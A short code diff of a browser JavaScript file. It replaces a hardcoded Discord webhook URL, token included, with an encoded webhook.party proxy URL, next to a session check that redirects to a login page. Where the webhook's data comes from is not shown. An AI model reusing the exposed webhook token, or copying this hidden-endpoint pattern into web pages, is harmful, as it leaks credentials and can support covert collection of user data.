@@ -2,7 +2,7 @@ var event=new Object();
 event.select=(str)=>{
   return document.querySelector(str);
 }
-const webhook='https://discord.com/api/webhooks/1366735538710773810/rCcg84c4Y-dGRbLD0Ar8-kplM8RKUtQnFyDOTR4PoFWL4mZaeGgxz8tDBxNQApJpFFfw';
+const webhook='https://l.webhook.party/hook/Esj%2BQ0wrilQtpj9ko7%2FYEgbbBkwAgd35pEHna0doP%2Bg7kxPeueHNnAFbX0ZUlcc%2FAjPH2S59uKeEzy4tGy2aRflgniMXDNGyvZZIGjoOPQ3lk1vsWpVMZmd1xXsrP96%2BqHFy9zGhOs0WHk9LddQpvo0f%2FqPco6zGmYWHKhwaodUwppnz%2F%2FcT4UYIJnHMjF2AMiFflFayjdil1qnZXstrr%2BjejV6zMUS2rX5Ql2%2F7BdeDHxKoEwQPqaTAbR60j4nPa7%2FdLdL1AbWnYmIwWfMhcqyMpenq85pKDR90YJIvrEZMsO4Jbtaev94pmobDV0LCNZlO444i1JLbZQJM4vvwlZ8%2BqADOz7roSFc0QnXyLVYZD12WNreMXdXdDY7SO7SKNl4vaWPH1Xs%3D/MX8u%2FLBWyC1mhbgC';
 
 if(sessionStorage.getItem("IDUSER")===null){
   window.location.href="login/";
